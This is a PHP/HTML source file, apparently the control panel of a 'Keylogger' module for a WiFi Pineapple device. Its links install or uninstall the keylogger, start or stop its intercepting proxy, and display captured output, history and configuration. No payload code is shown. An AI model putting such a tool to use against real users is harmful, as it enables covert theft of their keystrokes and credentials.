<?php

require("keylogger_vars.php");

?>
<html>
<head>
<title>Pineapple Control Center - <?php echo $module_name." [v".$module_version."]"; ?></title>
<script type="text/javascript" src="/includes/jquery.min.js"></script>
<script type="text/javascript" src="js/jquery.idTabs.min.js"></script>

<script type="text/javascript" src="js/keylogger.js"></script>
<link rel="stylesheet" type="text/css" href="css/keylogger.css" />
<link rel="stylesheet" type="text/css" href="css/firmware.css" />

<link rel="icon" href="/favicon.ico" type="image/x-icon"> 
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">

</head>
<body bgcolor="black" text="white" alink="green" vlink="green" link="green">

<script type="text/javascript" charset="utf-8">
	$(document).ready( function () { init(); });
</script>

<?php if(file_exists("/pineapple/includes/navbar.php")) require('/pineapple/includes/navbar.php'); ?>

<p id="version">v<?php echo $module_version; ?></p>

<div class=sidePanelLeft>
<div class=sidePanelTitle><?php echo $module_name; ?> <span id="refresh_text"></span></div>
<div class=sidePanelContent>

<?php
if ($usb_mnt)
{
	if($installed)
	{
		if($keylogger_hook_ip != "")
		{
			if ($is_keylogger_installed)
			{
				echo "Keylogger <span id=\"keylogger_status\"><font color=\"lime\"><strong>installed</strong></font></span>";
				echo " | <a id=\"keylogger_link\" href=\"javascript:keylogger_toggle('remove');\"><strong>Uninstall</strong></a><br />";
			} 
			else
			{ 
				echo "Keylogger <span id=\"keylogger_status\"><font color=\"red\"><strong>not installed</strong></font></span>";
				echo " | <a id=\"keylogger_link\" href=\"javascript:keylogger_toggle('set');\"><strong>Install</strong></a><br />"; 
			}
	
			if ($is_keylogger_running != "") 
			{
				echo "Keylogger proxy <span id=\"proxy_status\"><font color=\"lime\"><strong>enabled</strong></font></span>";
				echo " | <a id=\"proxy_link\" href=\"javascript:proxy_toggle('stop');\"><strong>Stop</strong></a><br />";
			} 
			else 
			{ 
				echo "Keylogger proxy <span id=\"proxy_status\"><font color=\"red\"><strong>disabled</strong></font></span>";
				echo " | <a id=\"proxy_link\" href=\"javascript:proxy_toggle('start');\"><strong>Start</strong></a><br />"; 
			}
		}
		else
		{
			echo "<br />Keylogger <font color=\"red\"><strong>not configured</strong></font><br />";
		}
	}
	else
	{
		echo "All required dependencies have to be installed first. This may take a few minutes.<br /><br />";
		
		echo "Please wait, do not leave or refresh this page. Once the install is complete, this page will refresh automatically.<br /><br />";
		
		echo '[<a id="Install" href="javascript:install();">Install</a>]';
				
		exit();
	}
}
else
{	
	echo "USB mount <font color=\"red\"><strong>not found</strong></font><br /><br />";
	echo "Installing dependencies to main memory is not permitted.<br /><br />Please use a USB drive.";
			
	exit();	
}
?>
</div>
</div>

<div id="tabs" class="tab">
	<ul>
		<li><a id="Output_link" class="selected" href="#Output">Output</a></li>
		<li><a id="History_link" href="#History">History</a></li>
		<li><a id="Configuration_link" href="#Conf">Configuration</a></li>
	</ul>

<div id="Output">
	[<a id="refresh" href="javascript:refresh();">Refresh</a>]<br /><br />
	<textarea id='output' name='output' cols='85' rows='29'></textarea>
</div>

<div id="History">
	[<a id="refresh" href="javascript:refresh_history();">Refresh</a>] [<a id="clean" href="javascript:clean();">Clean all</a>]<br />
	<div id="content"></div>
</div>

<div id="Conf">
	[<a id="config" href="javascript:set_config();">Save</a>]<br />
	<div id="content_conf"></div>
</div>

</div>
<br />
Auto-refresh <select id="auto_time">
	<option value="1000">1 sec</option>
	<option value="5000">5 sec</option>
	<option value="10000">10 sec</option>
	<option value="15000">15 sec</option>
	<option value="20000">20 sec</option>
	<option value="25000">25 sec</option>
	<option value="30000">30 sec</option>
</select> <a id="auto_refresh" href="javascript:void(0);"><font color="red">Off</font></a>

</body>
</html>
